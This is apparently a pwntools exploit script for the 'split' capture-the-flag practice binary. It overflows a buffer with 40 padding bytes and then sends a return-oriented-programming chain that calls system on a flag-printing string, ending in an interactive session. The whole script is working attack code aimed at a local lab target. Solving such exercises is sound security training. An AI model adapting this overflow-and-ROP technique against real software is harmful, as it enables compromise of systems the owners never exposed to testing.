#/usr/bin/env python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('./split')
io = process(elf.path)

#memory addresses
system = 0x400560
usefulFunction = 0x0000000000400742
gadget = 0x00000000004007c3
cat_flag = 0x601060

#ROP Chain
rop = ROP(elf)
rop.raw(gadget)
rop.raw(cat_flag)
rop.raw(system)
print "ROP Dump: \n" + (rop.dump())

# inject our needed A's and then build the ropchain
exploit = 'A'*40 + rop.chain()
exploit += 'B' * (0x60 - len(exploit))

# interact with the process
io.sendline(exploit)
io.interactive()
